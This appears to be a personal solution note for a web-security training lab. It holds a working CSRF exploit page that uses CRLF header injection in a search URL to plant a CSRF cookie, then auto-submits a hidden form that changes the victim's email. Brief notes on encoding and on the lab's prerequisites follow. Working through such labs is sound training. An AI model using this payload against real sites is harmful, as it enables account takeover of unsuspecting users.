```
<html>
    <body>
        <img src="https://0a92009704dc6bbd8253102a008c0096.web-security-academy.net?search=test%0d%0aSet-Cookie:csrfKey=Mu5LfKpj7XOLINgD5Z0XS22tibi8qcfZ%3b%20SameSite=None" />
        <form action="https://0a92009704dc6bbd8253102a008c0096.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned123@evil-user.net" />
            <input type="hidden" name="csrf" value="C3RckvumwECW9N47SvLi0q0aan8sWlcR">
        </form>
        <script>
            setTimeout(() => {
                document.forms[0].submit();
            }, 1000)
        </script>
    </body>
</html>
```

Prerequisite:
1. CSRF token is not bind to session cookie.
2. But in this lab, session can be set by search request, as wanted, so even CSRF token is binded to the session cookie, its still vulnerable.


- use img tag to set cookie, e.g. csrfKey
    - %0d: return
    - %0a: line break
    - %3b: semicolon
    - %20: space
    - Note: SameSite=None
    - use JS encodeURI/decodeURI
- form tag for doing csrf job, delivery csrf token
- setTimeout make sure the img request finished

<!--
    session=pf5fR8OHpU4Z2H7W14HyYG7ySNcVhOZG; LastSearchTerm=test; csrfKey=1U5Sp1GPbrAXoVaAlJRTTwsaGK4NL1Cl; session=p67BWEsu5ycWXgUQsD6H80gdUVAl47tK
    csrftoken = fMY5YXNx0oOtbB5QqpqPuC0j1BNgUrij

    - use
-->